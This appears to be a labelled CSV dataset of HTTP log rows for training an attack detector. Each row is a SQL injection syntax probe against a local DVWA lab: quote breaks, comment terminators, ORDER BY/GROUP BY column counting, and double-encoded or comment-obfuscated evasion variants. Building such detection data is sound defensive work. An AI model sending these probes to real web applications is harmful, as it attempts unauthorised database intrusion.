ip,timestamp,method,url,path,query,protocol,status,size,response_time,referer,user_agent,decoded_url,decoded_query,body,decoded_body,content_type,is_json_payload,json_depth,param_count_body,attack_type,existing_label
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%2F%2A%2A%2FGROUP%2F%2A%2A%2FBY%2F%2A%2A%2F1,/vulnerabilities/sqli/,id%3D1%2F%2A%2A%2FGROUP%2F%2A%2A%2FBY%2F%2A%2A%2F1,HTTP/1.1,200,1142,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1/**/GROUP/**/BY/**/1,id=1/**/GROUP/**/BY/**/1,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1--%3B--%2B-,/vulnerabilities/sqli/,id%3D1--%3B--%2B-,HTTP/1.1,200,3500,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1--;--+-,id=1--;--+-,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1\%22,/vulnerabilities/sqli/,id%3D1\%22,HTTP/1.1,200,1356,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1\""","id=1\""",,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli_blind/,/vulnerabilities/sqli_blind/,,HTTP/1.1,200,750,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli_blind/,,id=1'/*,id=1'/*,application/x-www-form-urlencoded,0,0,1,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1 ORDER BY 1,/vulnerabilities/sqli/,id%3D1 ORDER BY 1,HTTP/1.1,200,3033,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1 ORDER BY 1,id=1 ORDER BY 1,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%255C%2522&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%255C%2522&Submit=Submit,HTTP/1.1,200,3472,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=id%3D1%5C%22&Submit=Submit,id=id%3D1%5C%22&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%253B--%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%253B--%2B-&Submit=Submit,HTTP/1.1,200,3068,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%27%3B--+-&Submit=Submit,id=id%3D1%27%3B--+-&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1#,/vulnerabilities/sqli/,id%3D1,HTTP/1.1,200,2268,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1#,id=1,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2BORDER%2BBY%2B100%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2BORDER%2BBY%2B100%252F%252A&Submit=Submit,HTTP/1.1,200,3914,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1+ORDER+BY+100%2F%2A&Submit=Submit,id=id%3D1+ORDER+BY+100%2F%2A&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1')%23,/vulnerabilities/sqli/,id=1')%23,HTTP/1.1,200,531,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1')#,id=1')#,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1--%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1--%2523&Submit=Submit,HTTP/1.1,200,2683,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1--%23&Submit=Submit,id=id%3D1--%23&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1/**/ORDER/**/BY/**/1/*,/vulnerabilities/sqli/,id=1/**/ORDER/**/BY/**/1/*,HTTP/1.1,200,4157,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1/**/ORDER/**/BY/**/1/*,id=1/**/ORDER/**/BY/**/1/*,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2522%2529--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2522%2529--&Submit=Submit,HTTP/1.1,200,3631,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%22%29--&Submit=Submit,id=id%3D1%22%29--&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%252520GROUP%252520BY%2525201&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%252520GROUP%252520BY%2525201&Submit=Submit,HTTP/1.1,200,1129,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%2520GROUP%2520BY%25201&Submit=Submit,id=id%3D1%2520GROUP%2520BY%25201&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1----++-,/vulnerabilities/sqli/,id%3D1----++-,HTTP/1.1,200,1439,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1----  -,id=1----  -,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%23%2F%2A,/vulnerabilities/sqli/,id%3D1%23%2F%2A,HTTP/1.1,200,1590,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1#/*,id=1#/*,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%5C%22%2F%2A,/vulnerabilities/sqli/,id%3D1%5C%22%2F%2A,HTTP/1.1,200,2773,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1\""/*","id=1\""/*",,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1+ORDER+BY+1%23,/vulnerabilities/sqli/,id=1+ORDER+BY+1%23,HTTP/1.1,200,4256,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1 ORDER BY 1#,id=1 ORDER BY 1#,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%3B%2F%2A,/vulnerabilities/sqli/,id%3D1%27%3B%2F%2A,HTTP/1.1,200,2934,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1';/*,id=1';/*,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%255C%2527--%252520-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%255C%2527--%252520-&Submit=Submit,HTTP/1.1,200,1383,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%5C%27--%2520-&Submit=Submit,id=id%3D1%5C%27--%2520-&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%3B--,/vulnerabilities/sqli/,id%3D1%27%3B--,HTTP/1.1,200,3002,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1';--,id=1';--,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2BGROUP%2BBY%2B1--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2BGROUP%2BBY%2B1--&Submit=Submit,HTTP/1.1,200,1565,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=id%3D1+GROUP+BY+1--&Submit=Submit,id=id%3D1+GROUP+BY+1--&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27)#,/vulnerabilities/sqli/,id%3D1%27),HTTP/1.1,200,3504,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1')#,id=1'),,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,HTTP/1.1,200,2038,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/search.php,,id=1#--,id=1#--,application/x-www-form-urlencoded,0,0,1,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%255C%2527--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%255C%2527--&Submit=Submit,HTTP/1.1,200,3344,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%5C%27--&Submit=Submit,id=id%3D1%5C%27--&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%22%3B--%09-,/vulnerabilities/sqli/,id%3D1%22%3B--%09-,HTTP/1.1,200,1441,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1"";--	-","id=1"";--	-",,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%3B%3B--++-,/vulnerabilities/sqli/,id%3D1%27%3B%3B--++-,HTTP/1.1,200,4389,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1';;--  -,id=1';;--  -,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1+ORDER+BY+100%23,/vulnerabilities/sqli/,id%3D1+ORDER+BY+100%23,HTTP/1.1,200,2116,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1 ORDER BY 100#,id=1 ORDER BY 100#,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1\'#,/vulnerabilities/sqli/,id=1\',HTTP/1.1,200,3521,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1\'#,id=1\',,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%22%29%23,/vulnerabilities/sqli/,id%3D1%22%29%23,HTTP/1.1,200,1236,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1"")#","id=1"")#",,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%29%2523,/vulnerabilities/sqli/,id%3D1%27%29%2523,HTTP/1.1,200,3772,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1')%23,id=1')%23,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,HTTP/1.1,200,2582,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/login.php,,id=1\'%23,id=1\'#,application/x-www-form-urlencoded,0,0,1,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1 +ORDER BY+ 1--,/vulnerabilities/sqli/,id%3D1 +ORDER BY+ 1--,HTTP/1.1,200,803,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1  ORDER BY  1--,id=1  ORDER BY  1--,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%252520ORDER%252520BY%2525201%253B--%252520-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%252520ORDER%252520BY%2525201%253B--%252520-&Submit=Submit,HTTP/1.1,200,842,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%2520ORDER%2520BY%25201%3B--%2520-&Submit=Submit,id=id%3D1%2520ORDER%2520BY%25201%3B--%2520-&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1\',/vulnerabilities/sqli/,id=1\',HTTP/1.1,200,883,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1\',id=1\',,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1\%27,/vulnerabilities/sqli/,id%3D1\%27,HTTP/1.1,200,2748,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1\',id=1\',,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1--/*,/vulnerabilities/sqli/,id=1--/*,HTTP/1.1,200,680,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1--/*,id=1--/*,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1'--,/vulnerabilities/sqli/,id%3D1'--,HTTP/1.1,200,3932,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1'--,id=1'--,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,3362,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/,,"id=1\""--","id=1\""--",application/x-www-form-urlencoded,0,0,1,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,3059,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/,,id=1\%22#,"id=1\""#",application/x-www-form-urlencoded,0,0,1,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,HTTP/1.1,200,3521,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login.php,,id=1+ ORDER++BY++1,id=1  ORDER  BY  1,application/x-www-form-urlencoded,0,0,1,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%20GROUP%20BY%201--%20-,/vulnerabilities/sqli/,id=1%20GROUP%20BY%201--%20-,HTTP/1.1,200,3290,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1 GROUP BY 1-- -,id=1 GROUP BY 1-- -,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1 ORDER BY 100/*,/vulnerabilities/sqli/,id=1 ORDER BY 100/*,HTTP/1.1,200,1883,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1 ORDER BY 100/*,id=1 ORDER BY 100/*,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%5C%22--+-,/vulnerabilities/sqli/,id%3D1%5C%22--+-,HTTP/1.1,200,547,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1\""-- -","id=1\""-- -",,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2BORDER%2BBY%2B100--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2BORDER%2BBY%2B100--&Submit=Submit,HTTP/1.1,200,3329,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1+ORDER+BY+100--&Submit=Submit,id=id%3D1+ORDER+BY+100--&Submit=Submit,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1 ORDER BY 1;-- -,/vulnerabilities/sqli/,id=1 ORDER BY 1;-- -,HTTP/1.1,200,3461,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1 ORDER BY 1;-- -,id=1 ORDER BY 1;-- -,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27)/%2A,/vulnerabilities/sqli/,id%3D1%27)/%2A,HTTP/1.1,200,1175,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1')/*,id=1')/*,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%23%23,/vulnerabilities/sqli/,id=1%23%23,HTTP/1.1,200,2899,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1##,id=1##,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2523,/vulnerabilities/sqli/,id%3D1%27%2523,HTTP/1.1,200,1279,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1'%23,id=1'%23,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%5C%27%3B--+-,/vulnerabilities/sqli/,id%3D1%5C%27%3B--+-,HTTP/1.1,200,902,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1\';-- -,id=1\';-- -,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'%23,/vulnerabilities/sqli/,id=1'%23,HTTP/1.1,200,2707,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1'#,id=1'#,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1--%23,/vulnerabilities/sqli/,id=1--%23,HTTP/1.1,200,3725,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1--#,id=1--#,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1+ORDER+BY+1,/vulnerabilities/sqli/,id=1+ORDER+BY+1,HTTP/1.1,200,2977,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1 ORDER BY 1,id=1 ORDER BY 1,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%20ORDER%20BY%20100%23,/vulnerabilities/sqli/,id=1%20ORDER%20BY%20100%23,HTTP/1.1,200,1947,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1 ORDER BY 100#,id=1 ORDER BY 100#,,,,0,0,0,sqli_syntax_probe,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1+ORDER+BY+100,/vulnerabilities/sqli/,id=1+ORDER+BY+100,HTTP/1.1,200,971,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1 ORDER BY 100,id=1 ORDER BY 100,,,,0,0,0,sqli_syntax_probe,1
